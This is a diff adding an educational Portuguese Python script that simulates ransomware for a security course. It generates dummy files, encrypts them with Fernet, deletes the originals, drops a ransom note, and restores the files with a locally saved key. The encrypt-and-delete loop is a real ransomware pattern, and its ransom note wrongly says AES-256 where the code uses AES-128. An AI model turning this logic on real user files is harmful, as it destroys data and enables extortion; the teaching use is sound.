@@ -1,0 +1,246 @@
+"""
+========================================================
+  RANSOMWARE SIMULADO - FINS EDUCACIONAIS APENAS
+  Disciplina: Segurança da Informação / DIO
+  Autor: Elias
+    NÃO USAR EM SISTEMAS REAIS OU SEM AUTORIZAÇÃO
+========================================================
+
+Este script demonstra como um ransomware funciona:
+1. Cria arquivos de teste em uma pasta isolada
+2. Criptografa os arquivos com Fernet (AES-128)
+3. Exibe mensagem de "resgate" (simulada)
+4. Permite descriptografar com a chave correta
+
+Bibliotecas necessárias:
+    pip install cryptography
+"""
+
+import os
+import json
+from pathlib import Path
+from cryptography.fernet import Fernet
+
+
+# ─── Configuração da pasta de testes ──────────────────────────────────────────
+PASTA_TESTE = Path("arquivos_teste")
+PASTA_CRIPTOGRAFADA = Path("arquivos_criptografados")
+ARQUIVO_CHAVE = "chave_secreta.key"
+ARQUIVO_METADADOS = "metadados_ransomware.json"
+
+
+def criar_arquivos_teste():
+    """Cria arquivos simulados para demonstrar o ataque."""
+    PASTA_TESTE.mkdir(exist_ok=True)
+
+    arquivos = {
+        "relatorio_financeiro.txt": (
+            "Relatório Q4 2024\n"
+            "Receita Total: R$ 1.250.000\n"
+            "Despesas: R$ 890.000\n"
+            "Lucro Líquido: R$ 360.000\n"
+        ),
+        "clientes.txt": (
+            "ID | Nome | Email\n"
+            "001 | João Silva | joao@empresa.com\n"
+            "002 | Maria Santos | maria@empresa.com\n"
+            "003 | Pedro Oliveira | pedro@empresa.com\n"
+        ),
+        "projeto_secreto.txt": (
+            "Projeto Phoenix - CONFIDENCIAL\n"
+            "Lançamento: Março 2025\n"
+            "Orçamento: R$ 500.000\n"
+            "Equipe: 12 pessoas\n"
+        ),
+        "senhas_backup.txt": (  # ← Nunca faça isso na vida real!
+            "[SIMULAÇÃO - NUNCA ARMAZENE SENHAS EM TXT]\n"
+            "sistema_erp: senha_ficticia_123\n"
+            "banco_dados: outra_senha_ficticia\n"
+        ),
+    }
+
+    for nome, conteudo in arquivos.items():
+        caminho = PASTA_TESTE / nome
+        caminho.write_text(conteudo, encoding="utf-8")
+        print(f"  [+] Arquivo criado: {caminho}")
+
+    print(f"\n {len(arquivos)} arquivos de teste criados em '{PASTA_TESTE}/'")
+
+
+def gerar_chave() -> bytes:
+    """Gera uma chave Fernet (AES-128 em modo CBC com HMAC-SHA256)."""
+    chave = Fernet.generate_key()
+    with open(ARQUIVO_CHAVE, "wb") as f:
+        f.write(chave)
+    print(f"\n Chave gerada e salva em: {ARQUIVO_CHAVE}")
+    print(f"   Chave (base64): {chave.decode()}")
+    return chave
+
+
+def criptografar_arquivos(chave: bytes):
+    """
+    Simula a fase de criptografia do ransomware.
+    Em um ataque real, a chave seria enviada ao servidor do atacante.
+    """
+    PASTA_CRIPTOGRAFADA.mkdir(exist_ok=True)
+    fernet = Fernet(chave)
+    metadados = {}
+
+    arquivos = list(PASTA_TESTE.glob("*.txt"))
+    if not arquivos:
+        print(" Nenhum arquivo encontrado para criptografar.")
+        return
+
+    print("\n Iniciando criptografia...")
+    for caminho in arquivos:
+        dados_originais = caminho.read_bytes()
+        dados_criptografados = fernet.encrypt(dados_originais)
+
+        # Salva arquivo criptografado com extensão .locked
+        nome_criptografado = caminho.name + ".locked"
+        destino = PASTA_CRIPTOGRAFADA / nome_criptografado
+        destino.write_bytes(dados_criptografados)
+
+        # Remove o original (simulando o comportamento do ransomware)
+        caminho.unlink()
+
+        metadados[nome_criptografado] = caminho.name
+        print(f"  [] {caminho.name} → {nome_criptografado}")
+
+    # Salva metadados para a fase de descriptografia
+    with open(ARQUIVO_METADADOS, "w") as f:
+        json.dump(metadados, f, indent=2)
+
+    exibir_mensagem_resgate()
+
+
+def exibir_mensagem_resgate():
+    """Exibe a nota de resgate (simulada para fins educacionais)."""
+    mensagem = """
+╔══════════════════════════════════════════════════════════════╗
+║                SEUS ARQUIVOS FORAM CRIPTOGRAFADOS            ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║  [SIMULAÇÃO EDUCACIONAL - NÃO É UM ATAQUE REAL]              ║
+║                                                              ║
+║  Todos os seus arquivos importantes foram criptografados     ║
+║  usando AES-256. Sem a chave de descriptografia, é           ║
+║  impossível recuperar seus dados.                            ║
+║                                                              ║
+║  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   ║
+║  EM UM ATAQUE REAL, o criminoso pediria:                     ║
+║  → Pagamento em criptomoeda (Bitcoin, Monero)                ║
+║  → Prazo de 72 horas antes de destruir a chave               ║
+║  → Ameaça de publicar dados sensíveis (double extortion)     ║
+║  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   ║
+║                                                              ║
+║  NESTE LABORATÓRIO: Use a opção (3) para descriptografar.    ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+    """
+    print(mensagem)
+
+    # Cria o arquivo README_RECUPERE_SEUS_ARQUIVOS.txt (como ransomwares reais fazem)
+    nota_path = PASTA_CRIPTOGRAFADA / "README_RECUPERE_SEUS_ARQUIVOS.txt"
+    nota_path.write_text(mensagem, encoding="utf-8")
+    print(f"📄 Nota de resgate criada: {nota_path}")
+
+
+def descriptografar_arquivos(chave: bytes):
+    """
+    Simula a fase de descriptografia (após pagamento do resgate, em ataques reais).
+    Demonstra que SEM a chave correta, é impossível recuperar os dados.
+    """
+    if not PASTA_CRIPTOGRAFADA.exists():
+        print(" Pasta de arquivos criptografados não encontrada.")
+        return
+
+    if not Path(ARQUIVO_METADADOS).exists():
+        print(" Metadados não encontrados. Execute a criptografia primeiro.")
+        return
+
+    try:
+        fernet = Fernet(chave)
+    except Exception:
+        print(" Chave inválida! Em um ataque real, sem a chave correta, os dados são perdidos.")
+        return
+
+    with open(ARQUIVO_METADADOS) as f:
+        metadados = json.load(f)
+
+    PASTA_TESTE.mkdir(exist_ok=True)
+    print("\n Iniciando descriptografia...")
+
+    sucesso = 0
+    for nome_criptografado, nome_original in metadados.items():
+        caminho_enc = PASTA_CRIPTOGRAFADA / nome_criptografado
+        if not caminho_enc.exists():
+            print(f"  [!] Arquivo não encontrado: {nome_criptografado}")
+            continue
+
+        try:
+            dados_enc = caminho_enc.read_bytes()
+            dados_originais = fernet.decrypt(dados_enc)
+
+            destino = PASTA_TESTE / nome_original
+            destino.write_bytes(dados_originais)
+
+            print(f"  [] {nome_criptografado} → {nome_original}")
+            sucesso += 1
+        except Exception as e:
+            print(f"  [] Falha ao descriptografar {nome_criptografado}: {e}")
+
+    print(f"\n {sucesso}/{len(metadados)} arquivos recuperados em '{PASTA_TESTE}/'")
+
+
+def menu():
+    """Interface interativa para o laboratório."""
+    print("\n" + "═" * 60)
+    print("  LABORATÓRIO DE RANSOMWARE SIMULADO (Fins Educacionais)")
+    print("═" * 60)
+    print("  1. Criar arquivos de teste")
+    print("  2. Gerar chave e CRIPTOGRAFAR arquivos")
+    print("  3. DESCRIPTOGRAFAR arquivos (com a chave salva)")
+    print("  4. Executar demonstração completa (1 + 2 + 3)")
+    print("  0. Sair")
+    print("═" * 60)
+
+    while True:
+        opcao = input("\nEscolha uma opção: ").strip()
+
+        if opcao == "1":
+            criar_arquivos_teste()
+
+        elif opcao == "2":
+            if not PASTA_TESTE.exists() or not list(PASTA_TESTE.glob("*.txt")):
+                print("  Crie os arquivos de teste primeiro (opção 1).")
+                continue
+            chave = gerar_chave()
+            criptografar_arquivos(chave)
+
+        elif opcao == "3":
+            if not Path(ARQUIVO_CHAVE).exists():
+                print("  Arquivo de chave não encontrado. Execute a criptografia primeiro.")
+                continue
+            chave = Path(ARQUIVO_CHAVE).read_bytes()
+            descriptografar_arquivos(chave)
+
+        elif opcao == "4":
+            print("\n Executando demonstração completa...\n")
+            criar_arquivos_teste()
+            chave = gerar_chave()
+            criptografar_arquivos(chave)
+            input("\n  Observe os arquivos criptografados. Pressione Enter para descriptografar...")
+            descriptografar_arquivos(chave)
+            print("\n Demonstração concluída!")
+
+        elif opcao == "0":
+            print("\n Encerrando laboratório. Use este conhecimento para DEFENDER sistemas!")
+            break
+
+        else:
+            print("Opção inválida. Tente novamente.")
+
+
+if __name__ == "__main__":
+    menu()
